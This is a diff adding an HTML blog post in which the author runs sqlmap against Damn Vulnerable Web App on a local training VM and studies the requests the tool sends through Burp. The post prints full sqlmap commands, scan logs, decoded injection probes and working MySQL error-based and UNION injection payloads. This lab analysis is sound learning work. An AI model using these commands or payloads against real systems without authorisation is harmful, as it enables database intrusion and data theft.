@@ -1,0 +1,783 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <meta charset="utf-8" />
+        <title>What does sqlmap actually do?</title>
+        <link rel="stylesheet" href="http://stupentest.net/theme/css/main.css" />
+        <link href="http://stupentest.net/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Stupentest Atom Feed" />
+
+        <!--[if IE]>
+            <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+        <![endif]-->
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="http://stupentest.net/">Stupentest </a></h1>
+                <nav><ul>
+                    <li class="active"><a href="http://stupentest.net/category/blog.html">blog</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="http://stupentest.net/drafts/what-does-sqlmap-actually-do.html" rel="bookmark"
+           title="Permalink to What does sqlmap actually do?">What does sqlmap actually do?</a></h1>
+    </header>
+
+    <div class="entry-content">
+<footer class="post-info">
+        <abbr class="published" title="2013-06-27T00:00:00+02:00">
+                Published: Thu 27 June 2013
+        </abbr>
+
+        <address class="vcard author">
+                By                         <a class="url fn" href="http://stupentest.net/author/felix-ingram.html">Felix Ingram</a>
+        </address>
+<p>In <a href="http://stupentest.net/category/blog.html">blog</a>. </p>
+
+</footer><!-- /.post-info -->      <hr />
+<h1>Finding out what sqlmap actually does.</h1>
+<h2>Pressing go.</h2>
+<p>So you've found some SQL injection in your web app. But you want to do
+something a little more showy than your usual proof of concept. But, y'know,
+those can be little hard to remember. Plus there can be loads of typing
+involved. So you bust out sqlmap, run it, check the help, add some command line
+arguments, add some more, and then (if you're lucky) you'll get your
+shell/meterpreter/DB dump/whatever. Magic.</p>
+<p>But what the hell just happened? What if it didn't work? What if someone asked
+you to do it again?</p>
+<p>You could have a look at the code (it's only Python), and see what's happening
+but, well, I tried that. See <a href="https://github.com/sqlmapproject/sqlmap/pull/53">what
+happened</a>. If you've
+a better/braver person than me then go wild.</p>
+<h2>Bug hunting.</h2>
+<p>So let's ignore the code and see what it throws at an app. I'll using the <a href="http://www.dvwa.co.uk/">Damn
+Vulnerable Web App</a> on the <a href="https://code.google.com/p/owaspbwa/">OWASP Broken Web
+Applications Project</a> VM.</p>
+<p>Log in and skip to the SQL Injection tab:
+<img alt="SQL Injection tab" src="/images/dvwa_start_screen.png" title="Not my real username" /></p>
+<p>Let's bust it open with our not-at-all-racist test string:
+<img alt="SQL Injection error" src="/images/dvwa_first_error.png" title="This is our world now. The world of the electron and the switch; the beauty of the baud. We exist without nationality, skin color, or religious bias. You wage wars, murder, cheat, lie to us and try to make us believe it's for our own good, yet we're the criminals. Yes, I am a criminal. My crime is that of curiosity. I am a hacker, and this is my manifesto. You may stop me, but you can't stop us all." /></p>
+<p>Now we're cooking. Time to bust out the toolz!</p>
+<p><code>py -2 .\sqlmap.py --proxy=http://127.0.0.1:8080 -u "http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus&amp;Submit=Submit#" --cookie="PHPSESSID=7utdbu8ujguekphdg426i7juk6"</code></p>
+<p>A little explanation: <code>py -2</code> because I'm on Windows, <code>.\sqlmap.py</code> because
+PowerShell is awesome, <code>--proxy=http://127.0.0.1:8080</code> to pass everything through
+Burp, and <code>-u
+"http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus&amp;Submit=Submit#"</code>
+is the URL that we're attacking. We also pass in the <code>--cookie</code> option with the
+<code>PHPSeSSID</code> from our authenticated session. If you don't supply the cookie then
+the app will redirect us to the login screen and sqlmap will try and test that
+URL instead.</p>
+<p><em>IMPORTANT</em>: the URL is being attacked through a <code>GET</code> request. Sqlmap will
+attempt to find the injection point itself, so we're only passing in a basic
+string, <em>not</em> one that breaks the app.</p>
+<p>Hit go and we get:</p>
+<div class="highlight"><pre>[19++]:&gt; py -2 .\sqlmap.py --proxy=http://127.0.0.1:8080 -u
+&quot;http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus&amp;Submit=Submit#&quot;
+--cookie=&quot;PHPSESSID=7utdbu8ujguekphdg426i7juk6&quot;
+
+    sqlmap/1.0-dev-991cafc - automatic SQL injection and database takeover
+    tool
+    http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior
+mutual consent is illegal. It is the end user&#39;s responsibility to obey all
+applicable local, state and federal laws. Developers assume no liability
+and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 22:15:38
+
+[22:15:38] [INFO] testing connection to the target URL
+[22:15:38] [INFO] testing if the target URL is stable. This can take a couple of seconds
+[22:15:39] [INFO] target URL is stable
+[22:15:39] [INFO] testing if GET parameter &#39;id&#39; is dynamic
+[22:15:39] [WARNING] GET parameter &#39;id&#39; does not appear dynamic
+[22:15:39] [INFO] heuristics detected web page charset &#39;ascii&#39;
+[22:15:39] [INFO] heuristic (basic) test shows that GET parameter &#39;id&#39; might be injectable (possible DBMS: &#39;MySQL&#39;)
+[22:15:39] [INFO] testing for SQL injection on GET parameter &#39;id&#39; heuristic (parsing) test showed that the back-end DBMS could be &#39;MySQL&#39;.
+Do you want to skip test payloads specific for other DBMSes? [Y/n]
+</pre></div>
+
+
+<p>Sqlmap has detected that the app is running on MySQL (correct). But how did it
+do that? Let's see what ended up in Burp. The following requests were made:</p>
+<div class="highlight"><pre>http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus&amp;Submit=Submit
+http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus&amp;Submit=Submit
+http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=3776&amp;Submit=Submit
+http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus%28%29%5D%5D%27%2C%5D%27.%28&amp;Submit=Submit
+</pre></div>
+
+
+<p>The first two are the stabilty test. The third is the dynamic test. I'm
+assuming it's looking for a different response from the app - in this case the
+app doesn't respond differently if different user IDs are supplied. The fourth,
+and final test, is the magic. The valid value (Shamus) has been padded with
+<code>%28%29%5D%5D%27%2C%5D%27.%28</code>. Straight out of the
+<a href="http://www.amazon.co.uk/dp/1597499633">textbook</a>. A quick trip through decoder
+tells use that the string is <code>Shamus()]]',]'.(</code>.</p>
+<p><img alt="Another SQL Injection error" src="/images/dvwa_second_error.png" title="Remember, hacking is more than just a crime. It's a survival trait." /></p>
+<p>Sqlmap has used the magic of heuristics to determine that we're running MySQL.
+A quick look at the code shows that this is produced by <code>checkSqlInjection</code>,
+which uses <code>getSortedInjectionTests</code>, which uses <code>conf.tests</code>, which is an
+empty <code>AttribDict</code>. So we're none the wiser. Onwards!</p>
+<div class="highlight"><pre>heuristic (parsing) test showed that the back-end DBMS could be &#39;MySQL&#39;. Do
+you want to skip test payloads specific for other DBMSes? [Y/n] y
+do you want to include all tests for &#39;MySQL&#39; extending provided level (1) and
+risk (1)? [Y/n]
+</pre></div>
+
+
+<p>Level 1 and risk 1 sounds about right, so we'll just hit go again. You will
+want to page down a few times.</p>
+<div class="highlight"><pre>[22:46:54] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause&#39;
+[22:46:54] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause (MySQL comment)&#39;
+[22:46:55] [INFO] testing &#39;OR boolean-based blind - WHERE or HAVING clause (MySQL comment)&#39;
+[22:46:55] [INFO] testing &#39;MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)&#39;
+[22:46:56] [INFO] testing &#39;MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)&#39;
+[22:46:56] [INFO] testing &#39;MySQL boolean-based blind - Parameter replace (ELT - original value)&#39;
+[22:46:56] [INFO] testing &#39;MySQL boolean-based blind - Parameter replace (bool*int - original value)&#39;
+[22:46:56] [INFO] testing &#39;MySQL &gt;= 5.0 boolean-based blind - Parameter replace (original value)&#39;
+[22:46:56] [INFO] testing &#39;MySQL &lt; 5.0 boolean-based blind - Parameter replace (original value)&#39;
+[22:46:56] [INFO] testing &#39;MySQL &gt;= 5.0 boolean-based blind - GROUP BY and ORDER BY clauses&#39;
+[22:46:56] [INFO] testing &#39;MySQL &lt; 5.0 boolean-based blind - GROUP BY and ORDER BY clauses&#39;
+[22:46:56] [INFO] testing &#39;MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause&#39;
+[22:46:56] [INFO] testing &#39;MySQL &gt;= 5.1 AND error-based - WHERE or HAVING clause (EXTRACTVALUE)&#39;
+[22:46:57] [INFO] testing &#39;MySQL &gt;= 5.1 AND error-based - WHERE or HAVING clause (UPDATEXML)&#39;
+[22:46:57] [INFO] testing &#39;MySQL &gt;= 4.1 AND error-based - WHERE or HAVING clause&#39;
+[22:46:57] [INFO] testing &#39;MySQL &gt;= 5.0 OR error-based - WHERE or HAVING clause&#39;
+[22:46:57] [INFO] testing &#39;MySQL &gt;= 5.1 OR error-based - WHERE or HAVING clause (EXTRACTVALUE)&#39;
+[22:46:57] [INFO] testing &#39;MySQL &gt;= 5.1 OR error-based - WHERE or HAVING clause (UPDATEXML)&#39;
+[22:46:57] [INFO] testing &#39;MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause&#39;
+[22:46:58] [INFO] testing &#39;MySQL OR error-based - WHERE or HAVING clause&#39;
+[22:46:58] [INFO] testing &#39;MySQL &gt;= 5.0 error-based - Parameter replace&#39;
+[22:46:58] [INFO] testing &#39;MySQL &gt;= 5.1 error-based - Parameter replace (EXTRACTVALUE)&#39;
+[22:46:58] [INFO] testing &#39;MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)&#39;
+[22:46:58] [INFO] testing &#39;MySQL &gt;= 5.0 error-based - GROUP BY and ORDER BY clauses&#39;
+[22:46:58] [INFO] testing &#39;MySQL &gt;= 5.1 error-based - GROUP BY and ORDER BY clauses (EXTRACTVALUE)&#39;
+[22:46:58] [INFO] testing &#39;MySQL &gt;= 5.1 error-based - GROUP BY and ORDER BY clauses (UPDATEXML)&#39;
+[22:46:58] [INFO] testing &#39;MySQL inline queries&#39;
+[22:46:58] [INFO] testing &#39;MySQL &gt; 5.0.11 stacked queries&#39;
+[22:46:58] [INFO] testing &#39;MySQL &lt; 5.0.12 stacked queries (heavy query)&#39;
+[22:46:58] [INFO] testing &#39;MySQL &gt; 5.0.11 AND time-based blind&#39;
+[22:46:59] [INFO] testing &#39;MySQL &gt; 5.0.11 AND time-based blind (comment)&#39;
+[22:46:59] [INFO] testing &#39;MySQL &lt; 5.0.12 AND time-based blind (heavy query)&#39;
+[22:46:59] [INFO] testing &#39;MySQL &lt; 5.0.12 AND time-based blind (heavy query - comment)&#39;
+[22:46:59] [INFO] testing &#39;MySQL &gt; 5.0.11 OR time-based blind&#39;
+[22:46:59] [INFO] testing &#39;MySQL &lt; 5.0.12 OR time-based blind (heavy query)&#39;
+[22:47:00] [INFO] testing &#39;MySQL &gt;= 5.0 time-based blind - Parameter replace&#39;
+[22:47:00] [INFO] testing &#39;MySQL &lt; 5.0 time-based blind - Parameter replace (heavy queries)&#39;
+[22:47:00] [INFO] testing &#39;MySQL time-based blind - Parameter replace (bool*int)&#39;
+[22:47:00] [INFO] testing &#39;MySQL time-based blind - Parameter replace (MAKE_SET)&#39;
+[22:47:00] [INFO] testing &#39;MySQL time-based blind - Parameter replace (ELT)&#39;
+[22:47:00] [INFO] testing &#39;MySQL &gt;= 5.0.11 time-based blind - GROUP BY and ORDER BY clauses&#39;
+[22:47:00] [INFO] testing &#39;MySQL &lt; 5.0.12 time-based blind - GROUP BY and ORDER BY clauses (heavy query)&#39;
+[22:47:00] [INFO] testing &#39;MySQL UNION query (NULL) - 1 to 10 columns&#39;
+[22:47:02] [INFO] testing &#39;MySQL UNION query (random number) - 1 to 10 columns&#39;
+[22:47:03] [INFO] testing &#39;MySQL UNION query (NULL) - 11 to 20 columns&#39;
+[22:47:05] [INFO] testing &#39;MySQL UNION query (random number) - 11 to 20 columns&#39;
+[22:47:06] [INFO] testing &#39;MySQL UNION query (NULL) - 21 to 30 columns&#39;
+[22:47:08] [INFO] testing &#39;MySQL UNION query (random number) - 21 to 30 columns&#39;
+[22:47:09] [INFO] testing &#39;MySQL UNION query (NULL) - 31 to 40 columns&#39;
+[22:47:11] [INFO] testing &#39;MySQL UNION query (random number) - 31 to 40 columns&#39;
+[22:47:12] [INFO] testing &#39;MySQL UNION query (NULL) - 41 to 50 columns&#39;
+[22:47:14] [INFO] testing &#39;MySQL UNION query (random number) - 41 to 50 columns&#39;
+[22:47:15] [INFO] testing &#39;Generic UNION query (NULL) - 1 to 10 columns&#39;
+[22:47:17] [WARNING] GET parameter &#39;id&#39; is not injectable
+[22:47:17] [INFO] testing if GET parameter &#39;Submit&#39; is dynamic
+[22:47:17] [WARNING] GET parameter &#39;Submit&#39; does not appear dynamic
+[22:47:17] [WARNING] reflective value(s) found and filtering out
+[22:47:17] [WARNING] heuristic (basic) test shows that GET parameter &#39;Submit&#39; might not be injectable
+[22:47:17] [INFO] testing for SQL injection on GET parameter &#39;Submit&#39;
+[22:47:17] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause&#39;
+[22:47:18] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause (MySQL comment)&#39;
+[22:47:18] [INFO] testing &#39;OR boolean-based blind - WHERE or HAVING clause (MySQL comment)&#39;
+[22:47:19] [INFO] testing &#39;MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)&#39;
+[22:47:19] [INFO] testing &#39;MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)&#39;
+[22:47:19] [INFO] testing &#39;MySQL boolean-based blind - Parameter replace (ELT - original value)&#39;
+[22:47:19] [INFO] testing &#39;MySQL boolean-based blind - Parameter replace (bool*int - original value)&#39;
+[22:47:20] [INFO] testing &#39;MySQL &gt;= 5.0 boolean-based blind - Parameter replace (original value)&#39;
+[22:47:20] [INFO] testing &#39;MySQL &lt; 5.0 boolean-based blind - Parameter replace (original value)&#39;
+[22:47:20] [INFO] testing &#39;MySQL &gt;= 5.0 boolean-based blind - GROUP BY and ORDER BY clauses&#39;
+[22:47:20] [INFO] testing &#39;MySQL &lt; 5.0 boolean-based blind - GROUP BY and ORDER BY clauses&#39;
+[22:47:20] [INFO] testing &#39;MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause&#39;
+[22:47:20] [INFO] testing &#39;MySQL &gt;= 5.1 AND error-based - WHERE or HAVING clause (EXTRACTVALUE)&#39;
+[22:47:20] [INFO] testing &#39;MySQL &gt;= 5.1 AND error-based - WHERE or HAVING clause (UPDATEXML)&#39;
+[22:47:20] [INFO] testing &#39;MySQL &gt;= 4.1 AND error-based - WHERE or HAVING clause&#39;
+[22:47:21] [INFO] testing &#39;MySQL &gt;= 5.0 OR error-based - WHERE or HAVING clause&#39;
+[22:47:21] [INFO] testing &#39;MySQL &gt;= 5.1 OR error-based - WHERE or HAVING clause (EXTRACTVALUE)&#39;
+[22:47:21] [INFO] testing &#39;MySQL &gt;= 5.1 OR error-based - WHERE or HAVING clause (UPDATEXML)&#39;
+[22:47:21] [INFO] testing &#39;MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause&#39;
+[22:47:21] [INFO] testing &#39;MySQL OR error-based - WHERE or HAVING clause&#39;
+[22:47:22] [INFO] testing &#39;MySQL &gt;= 5.0 error-based - Parameter replace&#39;
+[22:47:22] [INFO] testing &#39;MySQL &gt;= 5.1 error-based - Parameter replace (EXTRACTVALUE)&#39;
+[22:47:22] [INFO] testing &#39;MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)&#39;
+[22:47:22] [INFO] testing &#39;MySQL &gt;= 5.0 error-based - GROUP BY and ORDER BY clauses&#39;
+[22:47:22] [INFO] testing &#39;MySQL &gt;= 5.1 error-based - GROUP BY and ORDER BY clauses (EXTRACTVALUE)&#39;
+[22:47:22] [INFO] testing &#39;MySQL &gt;= 5.1 error-based - GROUP BY and ORDER BY clauses (UPDATEXML)&#39;
+[22:47:22] [INFO] testing &#39;MySQL inline queries&#39;
+[22:47:22] [INFO] testing &#39;MySQL &gt; 5.0.11 stacked queries&#39;
+[22:47:22] [INFO] testing &#39;MySQL &lt; 5.0.12 stacked queries (heavy query)&#39;
+[22:47:22] [INFO] testing &#39;MySQL &gt; 5.0.11 AND time-based blind&#39;
+[22:47:22] [INFO] testing &#39;MySQL &gt; 5.0.11 AND time-based blind (comment)&#39;
+[22:47:22] [INFO] testing &#39;MySQL &lt; 5.0.12 AND time-based blind (heavy query)&#39;
+[22:47:23] [INFO] testing &#39;MySQL &lt; 5.0.12 AND time-based blind (heavy query - comment)&#39;
+[22:47:23] [INFO] testing &#39;MySQL &gt; 5.0.11 OR time-based blind&#39;
+[22:47:23] [INFO] testing &#39;MySQL &lt; 5.0.12 OR time-based blind (heavy query)&#39;
+[22:47:23] [INFO] testing &#39;MySQL &gt;= 5.0 time-based blind - Parameter replace&#39;
+[22:47:23] [INFO] testing &#39;MySQL &lt; 5.0 time-based blind - Parameter replace (heavy queries)&#39;
+[22:47:23] [INFO] testing &#39;MySQL time-based blind - Parameter replace (bool*int)&#39;
+[22:47:23] [INFO] testing &#39;MySQL time-based blind - Parameter replace (MAKE_SET)&#39;
+[22:47:23] [INFO] testing &#39;MySQL time-based blind - Parameter replace (ELT)&#39;
+[22:47:23] [INFO] testing &#39;MySQL &gt;= 5.0.11 time-based blind - GROUP BY and ORDER BY clauses&#39;
+[22:47:23] [INFO] testing &#39;MySQL &lt; 5.0.12 time-based blind - GROUP BY and ORDER BY clauses (heavy query)&#39;
+[22:47:23] [INFO] testing &#39;MySQL UNION query (NULL) - 1 to 10 columns&#39;
+[22:47:25] [INFO] testing &#39;MySQL UNION query (random number) - 1 to 10 columns&#39;
+[22:47:27] [INFO] testing &#39;MySQL UNION query (NULL) - 11 to 20 columns&#39;
+[22:47:29] [INFO] testing &#39;MySQL UNION query (random number) - 11 to 20 columns&#39;
+[22:47:30] [INFO] testing &#39;MySQL UNION query (NULL) - 21 to 30 columns&#39;
+[22:47:32] [INFO] testing &#39;MySQL UNION query (random number) - 21 to 30 columns&#39;
+[22:47:33] [INFO] testing &#39;MySQL UNION query (NULL) - 31 to 40 columns&#39;
+[22:47:35] [INFO] testing &#39;MySQL UNION query (random number) - 31 to 40 columns&#39;
+[22:47:36] [INFO] testing &#39;MySQL UNION query (NULL) - 41 to 50 columns&#39;
+[22:47:38] [INFO] testing &#39;MySQL UNION query (random number) - 41 to 50 columns&#39;
+[22:47:39] [INFO] testing &#39;Generic UNION query (NULL) - 1 to 10 columns&#39;
+[22:47:39] [WARNING] using unescaped version of the test because of zero
+knowledge of the back-end DBMS. You can try to explicitly set it using option &#39;--dbms&#39;
+[22:47:41] [WARNING] GET parameter &#39;Submit&#39; is not injectable
+[22:47:41] [CRITICAL] all tested parameters appear to be not injectable.
+Try to increase &#39;--level&#39;/&#39;--risk&#39; values to perform more tests. Also, you
+can try to rerun by providing either a valid value for option &#39;--string&#39;
+(or &#39;--regexp&#39;)
+
+[*] shutting down at 22:47:41
+
+C:\Users\Felix Ingram\Documents\development\sqlmap [master]
+[23++]:&gt;
+</pre></div>
+
+
+<p>That's 119 lines of output. Let's see what went through Burp. Here's the first
+request:</p>
+<div class="highlight"><pre>http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus%29%20AND%201424
+%3D3074%20AND%20%284974%3D4974&amp;Submit=Submit
+</pre></div>
+
+
+<p>Decoded version:</p>
+<div class="highlight"><pre>http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus) AND 1424
+=3074 AND (4974=4974&amp;Submit=Submit
+</pre></div>
+
+
+<p>Seems sensible.     </p>
+<div class="highlight"><pre>http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus) AND 9178=9178 AND (3817=3817&amp;Submit=Submit
+http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus) AND 8476=1778 AND (8681=8681&amp;Submit=Submit
+http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus AND 3079=3387&amp;Submit=Submit
+http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus AND 9178=9178&amp;Submit=Submit
+http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus AND 8079=1538&amp;Submit=Submit
+http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus&#39;) AND 6684=8259 AND (&#39;SdOi&#39;=&#39;SdOi&amp;Submit=Submit
+</pre></div>
+
+
+<p>Looks like we're doing some blind true/false integer tests to start with and end up
+with a 'false' string based tests. It then goes on with another 1570 requests
+or so.</p>
+<p>Wait. What?</p>
+<p>Okay.</p>
+<p>Wait. What?</p>
+<p>1570 requests and all we get is: </p>
+<div class="highlight"><pre>[22:47:39] [WARNING] using unescaped version of the test because of zero
+knowledge of the back-end DBMS. You can try to explicitly set it using option &#39;--dbms&#39;
+[22:47:41] [WARNING] GET parameter &#39;Submit&#39; is not injectable
+[22:47:41] [CRITICAL] all tested parameters appear to be not injectable.
+Try to increase &#39;--level&#39;/&#39;--risk&#39; values to perform more tests. Also, you
+can try to rerun by providing either a valid value for option &#39;--string&#39; (or &#39;--regexp&#39;)
+</pre></div>
+
+
+<p>But didn't we start with:</p>
+<div class="highlight"><pre>[22:15:39] [INFO] heuristic (basic) test shows that GET parameter &#39;id&#39; might be injectable (possible DBMS: &#39;MySQL&#39;)
+</pre></div>
+
+
+<p>What went wrong? Let's check the code...</p>
+<div class="highlight"><pre>&gt; go north
+It is pitch black. You are likely to be eaten by a grue.
+
+&gt; read code
+You have entered the Land of the Living Dead. Thousands of lost souls can be heard
+weeping and moaning. In the corner are stacked the remains of dozens of previous
+adventurers less fortunate than yourself. A passage exits to the north.  Lying in
+one corner of the room is a beautifully carved crystal skull. It appears to be
+grinning at you rather nastily.
+</pre></div>
+
+
+<p>Perhaps not then. Given that we're now committed to this, let's up the level or
+risk. The <code>--help</code> text tells us:</p>
+<div class="highlight"><pre><span class="n">Detection</span><span class="o">:</span>
+    <span class="n">These</span> <span class="n">options</span> <span class="n">can</span> <span class="n">be</span> <span class="n">used</span> <span class="n">to</span> <span class="n">customize</span> <span class="n">the</span> <span class="n">detection</span> <span class="n">phase</span>
+
+    <span class="o">--</span><span class="n">level</span><span class="o">=</span><span class="n">LEVEL</span>       <span class="n">Level</span> <span class="n">of</span> <span class="n">tests</span> <span class="n">to</span> <span class="n">perform</span> <span class="o">(</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">,</span> <span class="k">default</span> <span class="mi">1</span><span class="o">)</span>
+    <span class="o">--</span><span class="n">risk</span><span class="o">=</span><span class="n">RISK</span>         <span class="n">Risk</span> <span class="n">of</span> <span class="n">tests</span> <span class="n">to</span> <span class="n">perform</span> <span class="o">(</span><span class="mi">0</span><span class="o">-</span><span class="mi">3</span><span class="o">,</span> <span class="k">default</span> <span class="mi">1</span><span class="o">)</span>
+</pre></div>
+
+
+<p>Bumping the level seems like a good start.</p>
+<div class="highlight"><pre>[25++]:&gt; py -2 .\sqlmap.py --proxy=http://127.0.0.1:8080 -u &quot;http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus&amp;Submit=Submit#&quot;
+--cookie=&quot;PHPSESSID=7utdbu8ujguekphdg426i7juk6&quot; --level=2
+</pre></div>
+
+
+<p>We bump the level up to 2. We get another 5801 requests. We end up with:</p>
+<div class="highlight"><pre>[23:22:19] [WARNING] Cookie parameter &#39;PHPSESSID&#39; is not injectable
+[23:22:19] [CRITICAL] all tested parameters appear to be not injectable.
+Try to increase &#39;--level&#39;/&#39;--risk&#39; values to perform more tests. Also, you
+can try to rerun by providing either a valid value for option &#39;--string&#39;
+(or &#39;--regexp&#39;)
+</pre></div>
+
+
+<p>The WARNING tells us that sqlmap tested the PHPSESSID cookie, which actually
+logged us out (not shown). Something isn't working, so let's see whether we can
+give sqlmap some hints. Scanning the help text shows us that we can use the
+<code>-p</code> option to provide a parameter and the <code>--dbms</code> option to tell it what
+database is in use. We'll know what value to pass, as it. found. them. when.
+we. first. ran. the. tool.</p>
+<div class="highlight"><pre>[26++]:&gt; py -2 .\sqlmap.py --proxy=http://127.0.0.1:8080 -u &quot;http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus&amp;Submit=Submit#&quot;
+--cookie=&quot;PHPSESSID=7utdbu8ujguekphdg426i7juk6&quot; -p id --dbms=mysql
+</pre></div>
+
+
+<p>Supplying the parameter and DB produces just 154 requests. But we still get our
+CRITICAL error:</p>
+<div class="highlight"><pre>[23:35:06] [CRITICAL] all tested parameters appear to be not injectable.  Try to increase
+&#39;--level&#39;/&#39;--risk&#39; values to perform more tests. As heuristic test turned out positive you are
+strongly advised to continue on with the tests. Please, consider usage of tampering scripts as
+your target might filter the queries. Also, you can try to rerun by providing either a valid
+value for option &#39;--string&#39; (or &#39;--regexp&#39;)
+</pre></div>
+
+
+<p>Let's turn it up to 11:</p>
+<div class="highlight"><pre>[29++]:&gt; py -2 .\sqlmap.py --proxy=http://127.0.0.1:8080 -u &quot;http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus&amp;Submit=Submit#&quot;
+--cookie=&quot;PHPSESSID=7utdbu8ujguekphdg426i7juk6&quot; -p id --dbms=mysql
+--level=5 --risk=3
+</pre></div>
+
+
+<p>10,235 requests later:</p>
+<div class="highlight"><pre>[23:54:02] [WARNING] GET parameter &#39;id&#39; is not injectable
+[23:54:02] [CRITICAL] all tested parameters appear to be not injectable. As heuristic test
+turned out positive you are strongly advised to continue on with the tests. Please, consider
+usage of tampering scripts as your target might filter the queries. Also, you can try to rerun
+by providing either a valid value for option &#39;--string&#39; (or &#39;--regexp&#39;)
+</pre></div>
+
+
+<p>So we're still not getting anywhere. Sqlmap does have a few more tricks up its
+sleeve, however. One nice option is the ability to provide it with a raw
+request from Burp (or similar) and have it work out everything from there.</p>
+<div class="highlight"><pre>[3+]:&gt; py -2 .\sqlmap.py -r .\SQLi_test_request --dbms=mysql -p id --proxy...
+</pre></div>
+
+
+<p>Still telling it the DB and parameter to look at, but let's see whether it gets
+us any further.</p>
+<div class="highlight"><pre>[4+]:&gt; py -2 .\sqlmap.py -r .\SQLi_test_request --dbms=mysql -p id --proxy=http://127.0.0.1:8080 --banner
+
+    sqlmap/1.0-dev-991cafc - automatic SQL injection and database takeover tool
+    http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is
+illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal
+laws. Developers assume no liability and are not responsible for any misuse or damage caused by
+this program
+
+[*] starting at 13:37:57
+
+[13:37:57] [INFO] parsing HTTP request from &#39;.\SQLi_test_request&#39;
+[13:37:57] [INFO] testing connection to the target URL
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=Shamus&#39; AND (SELECT 7874 FROM(SELECT COUNT(*),CONCAT(0x7170766f71,(SELECT (CASE
+    WHEN (7874=7874) THEN 1 ELSE 0 END)),0x71747a6c71,FLOOR(RAND(0)*2))x FROM
+    INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND &#39;eSMd&#39;=&#39;eSMd&amp;Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=Shamus&#39; UNION ALL SELECT NULL,CONCAT(0x7170766f71,0x72775441686f75625a6c,0x71747a6c71)#&amp;Submit=Submit
+---
+[13:37:57] [INFO] testing MySQL
+[13:37:57] [WARNING] reflective value(s) found and filtering out
+[13:37:57] [INFO] confirming MySQL
+[13:37:58] [INFO] the back-end DBMS is MySQL
+[13:37:58] [INFO] fetching banner
+web server operating system: Linux Ubuntu 10.04 (Lucid Lynx)
+web application technology: PHP 5.3.2, Apache 2.2.14
+back-end DBMS operating system: Linux Ubuntu
+back-end DBMS: MySQL &gt;= 5.0.0
+banner:    &#39;5.1.41-3ubuntu12.6-log&#39;
+[13:37:58] [INFO] fetched data logged to text files under &#39;C:\Users\Felix Ingram\Documents\development\sqlmap\output\192.168.253.133&#39;
+
+[*] shutting down at 13:37:58
+</pre></div>
+
+
+<p>Wait. What?</p>
+<p>So when we pass in the request, we can grab the banner in only a handful of
+requests. Let's try our original command again:</p>
+<div class="highlight"><pre>[6+]:&gt;  py -2 .\sqlmap.py --proxy=http://127.0.0.1:8080 -u &quot;http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus&amp;Submit=Submit#&quot;
+-p id --dbms=mysql --cookie=&quot;PHPSESSID=mc2m3bbdca59a8k3vd81f7kqd1&quot; --banner
+
+sqlmap/1.0-dev-991cafc - automatic SQL injection and database takeover tool
+http://sqlmap.org
+
+... snip ...
+
+[14:01:41] [INFO] the back-end DBMS is MySQL
+[14:01:41] [INFO] fetching banner
+web server operating system: Linux Ubuntu 10.04 (Lucid Lynx)
+web application technology: PHP 5.3.2, Apache 2.2.14
+back-end DBMS operating system: Linux Ubuntu
+back-end DBMS: MySQL &gt;= 5.0.0
+banner:    &#39;5.1.41-3ubuntu12.6-log&#39;
+</pre></div>
+
+
+<p>So we can retrieve things using the full command line version. One of the
+reasons for this is that sqlmap remembers some state information between runs.
+For the sake of experimenting, let's delete all of the cached information and
+run things again:</p>
+<div class="highlight"><pre>[7+]:&gt; rm .\output\*
+
+Confirm
+The item at C:\Users\Felix Ingram\Documents\development\sqlmap\output\192.168.253.133 has
+children and the Recurse parameter was not specified. If you continue, all children will be
+removed with the item. Are you sure you want to continue?
